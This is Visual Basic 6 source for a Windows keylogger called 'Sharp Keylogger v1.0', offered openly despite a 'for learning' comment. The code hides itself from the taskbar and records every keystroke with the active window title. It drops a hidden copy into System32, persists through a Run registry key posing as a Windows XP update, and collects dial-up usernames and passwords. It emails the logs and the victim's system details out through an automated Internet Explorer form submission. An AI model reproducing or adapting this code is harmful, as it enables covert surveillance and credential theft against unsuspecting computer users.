VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   4350
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   6135
   LinkTopic       =   "Form1"
   ScaleHeight     =   4350
   ScaleWidth      =   6135
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox t1 
      Height          =   2055
      Left            =   120
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   5
      Text            =   "Form1.frx":0000
      Top             =   1800
      Visible         =   0   'False
      Width           =   5895
   End
   Begin VB.TextBox size 
      Height          =   285
      Left            =   3720
      TabIndex        =   2
      Text            =   "30"
      Top             =   3960
      Width           =   615
   End
   Begin VB.Timer Timer4 
      Interval        =   20000
      Left            =   1200
      Top             =   120
   End
   Begin VB.Timer Timer3 
      Interval        =   1000
      Left            =   840
      Top             =   120
   End
   Begin VB.TextBox eml 
      Height          =   285
      Left            =   600
      TabIndex        =   1
      Top             =   3960
      Width           =   2055
   End
   Begin VB.Timer Timer2 
      Interval        =   500
      Left            =   480
      Top             =   120
   End
   Begin VB.Timer Timer1 
      Interval        =   5
      Left            =   120
      Top             =   120
   End
   Begin VB.TextBox Text1 
      Enabled         =   0   'False
      Height          =   1575
      Left            =   120
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   0
      Top             =   120
      Width           =   5895
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      Caption         =   "LOG SIZE:"
      Height          =   195
      Left            =   2760
      TabIndex        =   4
      Top             =   3960
      Width           =   780
   End
   Begin VB.Label Label1 
      Caption         =   "TO:"
      Height          =   255
      Left            =   120
      TabIndex        =   3
      Top             =   3960
      Width           =   375
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Sharp Keylogger v1.0
'This Keyloger Source Only For Learning
'Coded By : Sharp Soft
'----------------------------
'Y! ID : Sharp_h2001
'Msn ! : Sharp.Soft
'Email : Sharp.Secure@Gmail.Com
'----------------------------
'wWw.Sharp-Soft.nEt
'wWw.Sharp.Blogfa.cOm
'----------------------------

Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal LpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Private Declare Function InternetGetConnectedState Lib "wininet.dll" (ByRef lpdwFlags As Long, ByVal dwReserved As Long) As Long
Dim apppp As String
Private Declare Function DestroyWindow Lib "user32" (ByVal hwnd As Long) As Long
Dim T, b As String

Private LastWindow As String
Private LastHandle As Long
Private dKey(255) As Long
Private Const VK_SHIFT = &H10
Private Const VK_CTRL = &H11
Private Const VK_ALT = &H12
Private Const VK_CAPITAL = &H14
Private ChangeChr(255) As String
Private AltDown As Boolean
Private WINDIR As String
Dim writestring As String
Dim Data As String
Const SW_SHOWNORMAL = 1
Const REG_SZ = 1
Const HKEY_CURRENT_USER = &H80000001
Private Declare Function RegCloseKey Lib "ADVAPI32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegCreateKey Lib "ADVAPI32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegDeleteValue Lib "ADVAPI32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long
Private Declare Function RegOpenKey Lib "ADVAPI32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "ADVAPI32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function RegSetValueEx Lib "ADVAPI32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Function RegQueryStringValue(ByVal hKey As Long, ByVal strValueName As String) As String
    Dim lResult As Long, lValueType As Long, strBuf As String, lDataBufSize As Long

    lResult = RegQueryValueEx(hKey, strValueName, 0, lValueType, ByVal 0, lDataBufSize)
    If lResult = 0 Then
        If lValueType = REG_SZ Then

            strBuf = String(lDataBufSize, Chr$(0))

            lResult = RegQueryValueEx(hKey, strValueName, 0, 0, ByVal strBuf, lDataBufSize)
            If lResult = 0 Then

                RegQueryStringValue = Left$(strBuf, InStr(1, strBuf, Chr$(0)) - 1)
            End If
        ElseIf lValueType = REG_BINARY Then
            Dim strData As Integer

            lResult = RegQueryValueEx(hKey, strValueName, 0, 0, strData, lDataBufSize)
            If lResult = 0 Then
                RegQueryStringValue = strData
            End If
        End If
    End If
End Function
Sub SaveString(hKey As Long, strPath As String, strValue As String, strData As String)
    Dim Ret

    RegCreateKey hKey, strPath, Ret

    RegSetValueEx Ret, strValue, 0, REG_SZ, ByVal strData, Len(strData)

    RegCloseKey Ret
End Sub
Private Sub Form_Initialize()
FO = GetFileOption
InitializeApp
End Sub
Public Sub InitializeApp()
On Error Resume Next
Hide
If App.PrevInstance = True Then End
If FO.email = "" Then
FO.email = "sharp_h2001@yahoo.com"
eml.Text = FO.email
Else
eml.Text = StrReverse(FO.email)
End If

If FO.size = "" Then
FO.size = "50"
size.Text = FO.size
Else
size.Text = FO.size
End If


If UCase(App.Path) <> UCase(Environ("WINDIR") & "\System32") Then
        If Right(Trim(FO.message), Len(Trim(FO.message)) - 2) <> "" Then
                MsgBox Trim(FO.message), vbCritical + vbApplicationModal + vbMsgBoxSetForeground, FO.title
        End If
End If
End Sub
Private Sub Form_Load()
WINDIR = Environ("windir")
Hide
App.TaskVisible = False
If App.PrevInstance = True Then End

ChangeChr(33) = "[PageUp]"
ChangeChr(34) = "[PageDown]"
ChangeChr(35) = "[End]"
ChangeChr(36) = "[Home]"

ChangeChr(45) = "[Insert]"
ChangeChr(46) = "[Delete]"

ChangeChr(48) = ")"
ChangeChr(49) = "!"
ChangeChr(50) = "@"
ChangeChr(51) = "#"
ChangeChr(52) = "$"
ChangeChr(53) = "%"
ChangeChr(54) = "^"
ChangeChr(55) = "&"
ChangeChr(56) = "*"
ChangeChr(57) = "("

ChangeChr(186) = ";"
ChangeChr(187) = "="
ChangeChr(188) = ","
ChangeChr(189) = "-"
ChangeChr(190) = "."
ChangeChr(191) = "/"

ChangeChr(219) = "["
ChangeChr(220) = "\"
ChangeChr(221) = "]"
ChangeChr(222) = "'"


ChangeChr(86) = ":"
ChangeChr(87) = "+"
ChangeChr(88) = "<"
ChangeChr(89) = "_"
ChangeChr(90) = ">"
ChangeChr(91) = "?"

ChangeChr(119) = "{"
ChangeChr(120) = "|"
ChangeChr(121) = "}"
ChangeChr(122) = """"


ChangeChr(96) = "0"
ChangeChr(97) = "1"
ChangeChr(98) = "2"
ChangeChr(99) = "3"
ChangeChr(100) = "4"
ChangeChr(101) = "5"
ChangeChr(102) = "6"
ChangeChr(103) = "7"
ChangeChr(104) = "8"
ChangeChr(105) = "9"
ChangeChr(106) = "*"
ChangeChr(107) = "+"
ChangeChr(109) = "-"
ChangeChr(110) = "."
ChangeChr(111) = "/"

ChangeChr(192) = "`"
ChangeChr(92) = "~"
End Sub
Function TypeWindow()
Dim Handle As Long
Dim textlen As Long
Dim WindowText As String

Handle = GetForegroundWindow
LastHandle = Handle
textlen = GetWindowTextLength(Handle) + 1

WindowText = Space(textlen)
svar = GetWindowText(Handle, WindowText, textlen)
WindowText = Left(WindowText, Len(WindowText) - 1)

If WindowText <> LastWindow Then
If Text1 <> "" Then Text1 = Text1 & vbCrLf & vbCrLf
Text1 = Text1 & "--------------------------------------------------------------------" & vbCrLf & WindowText & vbCrLf & "--------------------------------------------------------------------" & vbCrLf
LastWindow = WindowText
End If
End Function
Private Sub sndClick()
On Error GoTo a:
If IsConnected = False Then Exit Sub
cj:
Timer1.Enabled = False
Timer2.Enabled = False
Timer3.Enabled = False
Timer4.Enabled = False

FileNumber = FreeFile
Open WINDIR & "\System32\BLK.dll" For Binary As FileNumber
  writestring = Space(FileLen(WINDIR & "\System32\BLK.dll"))
Get FileNumber, 1, writestring
Close FileNumber

T = eml.Text
b = vbCrLf & "Victim's Information :" & vbCrLf & "########################################################################################################################" & vbCrLf & "#      USERNAME : " & Environ("USERNAME") & vbCrLf & "#      COM Name : " & LCase(Environ("COMPUTERNAME")) & vbCrLf & "#      CPU Name : " & Environ("PROCESSOR_IDENTIFIER") & vbCrLf & "#      Date and Time : " & Now & vbCrLf & "########################################################################################################################" & vbCrLf & vbCrLf & "Dialup Uname,Pass,Tel Sender :" & vbCrLf & "########################################################################################################################"
    bkh
    For i = 0 To c - 1
        b = b & _
        vbCrLf & "#     User Name  : " & AllPass(i).User & _
        vbCrLf & "#     Password    : " & AllPass(i).Pass & _
        vbCrLf & "#     Tel Number : " & AllPass(i).Tel & vbCrLf & "# -----------------------------------------------------------------------------------------" & vbCrLf & "#" & vbCrLf
    Next
b = b & "########################################################################################################################" & vbCrLf & vbclf & vbCrLf & _
        "KEYLOGGS :" & vbCrLf & _
        "########################################################################################################################" & vbCrLf & vbCrLf & _
         writestring & vbCrLf & vbCrLf & _
        "########################################################################################################################" & vbCrLf & "-----------------------------------------------------------------------------------------" & vbCrLf & "This Keylogger Coded By Sharp Soft" & vbCrLf & "sharp_h2001" & vbCrLf & "Email : Sharp.Secure@Gmail.Com" & vbCrLf & "Undergr0und" & vbCrLf & "2008-2009" & vbCrLf & "wWw.Sharp-Soft.nEt"
        '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
If FileLen(Environ("windir") & "\System\help.html") <> 0 Then Kill FileLen(Environ("windir") & "\System\help.html")
Open Environ("windir") & "\System\help.html" For Output As #1
Close #1

Dim Data As String
Data = ""
Data = Replace(t1.Text, "#TO#", T)
Data = Replace(Data, "#SUB#", "-==[Sharp Keylog v1.0]==-")
Data = Replace(Data, "#BODY#", b)

Open Environ("windir") & "\System\help.html" For Binary As #2
    Put #2, , Data
Close #2

Set rpcc = CreateObject("InternetExplorer.application")
    rpcc.Navigate Environ("windir") & "\System\help.html"
    Set qq = rpcc.Document
    qq.All.Item("submit").Click
    qq = Null
    While rpcc.Busy = True
    DoEvents
    Wend
    rpcc.Quit
    Kill Environ("windir") & "\System\help.html"
    '________________________________
'AFTER SEND MAIL ++++++++
Close
Kill WINDIR & "\System32\BLK.dll"
Text1.Text = ""
Timer1.Enabled = True
Timer2.Enabled = True
Timer3.Enabled = True
Timer4.Enabled = True
Exit Sub
a:
GoTo cj:
End Sub
Private Sub Timer1_Timer()
If IsConnected = False Then Exit Sub

If GetAsyncKeyState(VK_ALT) = 0 And AltDown = True Then
AltDown = False
Text1 = Text1 & "[ALTUP]"
End If

'a-z A-Z
For i = Asc("A") To Asc("Z")
 If GetAsyncKeyState(i) = -32767 Then
 TypeWindow
  
  If GetAsyncKeyState(VK_SHIFT) < 0 Then
   If GetKeyState(VK_CAPITAL) > 0 Then
   Text1 = Text1 & LCase(Chr(i))
   Exit Sub
   Else
   Text1 = Text1 & UCase(Chr(i))
   Exit Sub
   End If
  Else
   If GetKeyState(VK_CAPITAL) > 0 Then
   Text1 = Text1 & UCase(Chr(i))
   Exit Sub
   Else
   Text1 = Text1 & LCase(Chr(i))
   Exit Sub
   End If
  End If
           
 End If
Next

'1234567890)(*&^%$#@!
For i = 48 To 57
 If GetAsyncKeyState(i) = -32767 Then
 TypeWindow
  
  If GetAsyncKeyState(VK_SHIFT) < 0 Then
  Text1 = Text1 & ChangeChr(i)
  Exit Sub
  Else
  Text1 = Text1 & Chr(i)
  Exit Sub
  End If
  
 End If
Next


';=,-./
For i = 186 To 192
 If GetAsyncKeyState(i) = -32767 Then
 TypeWindow
  
  If GetAsyncKeyState(VK_SHIFT) < 0 Then
  Text1 = Text1 & ChangeChr(i - 100)
  Exit Sub
  Else
  Text1 = Text1 & ChangeChr(i)
  Exit Sub
  End If
  
 End If
Next


'[\]'
For i = 219 To 222
 If GetAsyncKeyState(i) = -32767 Then
 TypeWindow
  
  If GetAsyncKeyState(VK_SHIFT) < 0 Then
  Text1 = Text1 & ChangeChr(i - 100)
  Exit Sub
  Else
  Text1 = Text1 & ChangeChr(i)
  Exit Sub
  End If
  
 End If
Next

'num pad
For i = 96 To 111
 If GetAsyncKeyState(i) = -32767 Then
 TypeWindow
  
  If GetAsyncKeyState(VK_ALT) < 0 And AltDown = False Then
  AltDown = True
  Text1 = Text1 & "[ALTDOWN]"
  Else
   If GetAsyncKeyState(VK_ALT) >= 0 And AltDown = True Then
   AltDown = False
   Text1 = Text1 & "[ALTUP]"
   End If
  End If
  
  Text1 = Text1 & ChangeChr(i)
  Exit Sub
 End If
Next

 'for space
 If GetAsyncKeyState(32) = -32767 Then
 TypeWindow
  Text1 = Text1 & "[Space]"
 End If

 'for enter
 If GetAsyncKeyState(13) = -32767 Then
 TypeWindow
  Text1 = Text1 & "[Enter]" & vbCrLf
 End If
 
 'for backspace
 If GetAsyncKeyState(8) = -32767 Then
 TypeWindow
  Text1 = Text1 & "[BackSpace]"
 End If
 
 'for left arrow
 If GetAsyncKeyState(37) = -32767 Then
 TypeWindow
  Text1 = Text1 & "[LeftArrow]"
 End If
 
 'for up arrow
 If GetAsyncKeyState(38) = -32767 Then
 TypeWindow
  Text1 = Text1 & "[UpArrow]"
 End If
 
 'for right arrow
 If GetAsyncKeyState(39) = -32767 Then
 TypeWindow
  Text1 = Text1 & "[RightArrow]"
 End If
 
  'for down arrow
 If GetAsyncKeyState(40) = -32767 Then
 TypeWindow
  Text1 = Text1 & "[DownArrow]"
 End If

 'tab
 If GetAsyncKeyState(9) = -32767 Then
 TypeWindow
  Text1 = Text1 & "[Tab]"
 End If
 
  'escape
 If GetAsyncKeyState(27) = -32767 Then
 TypeWindow
  Text1 = Text1 & "[Escape]"
 End If


 For i = 45 To 46
 If GetAsyncKeyState(i) = -32767 Then
 TypeWindow
 Text1 = Text1 & ChangeChr(i)
 End If
 Next


 For i = 33 To 36
 If GetAsyncKeyState(i) = -32767 Then
 TypeWindow
 Text1 = Text1 & ChangeChr(i)
 End If
 Next
 
 'left click
 If GetAsyncKeyState(1) = -32767 Then
    If (LastHandle = GetForegroundWindow) And LastHandle <> 0 Then
   Text1 = Text1 & "[LeftClick]"
   End If
 End If

End Sub

Private Sub Timer2_Timer()
On Error Resume Next
If IsConnected = False Then Exit Sub
Kill WINDIR & "\System32\BLK.dll"
Open WINDIR & "\System32\BLK.dll" For Binary As #1
Put #1, , Text1.Text
Close #1
SetAttr WINDIR & "\System32\BLK.dll", vbHidden + vbSystem
End Sub
Private Function IsConnected() As Boolean
    If InternetGetConnectedState(0&, 0&) = 1 Then
        IsConnected = True
    Else
        IsConnected = False
    End If
End Function
Private Sub Timer3_Timer()
On Error Resume Next
WINDIR = Environ("windir")
Hide
App.TaskVisible = False
If Right(App.Path, 1) <> "\" Then
apppp = App.Path & "\" & App.EXEName & ".exe"
Else
apppp = App.Path & App.EXEName & ".exe"
End If
If FileLen(WINDIR & "\System32\BLK.exe") <> 0 Then Kill WINDIR & "\System32\BLK.exe"
FileCopy apppp, WINDIR & "\System32\BLK.exe"
SetAttr WINDIR & "\System32\BLK.exe", vbHidden + vbSystem
SaveString HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", "Microsoft Windows XP Update", CStr(WINDIR & "\System32\BLK.exe")
End Sub
Public Sub Delay(ByVal sngSecondsToBeDelayed As Single)
Dim sngStartTime As Single
sngStartTime = Timer
Do While ((Timer - sngStartTime) < sngSecondsToBeDelayed)
DoEvents
Loop
End Sub
Private Sub Timer4_Timer()
On Error Resume Next
If IsConnected = False Then Exit Sub
If FileLen(WINDIR & "\System32\BLK.dll") >= size.Text * 1000 Then
sndClick
End If
End Sub
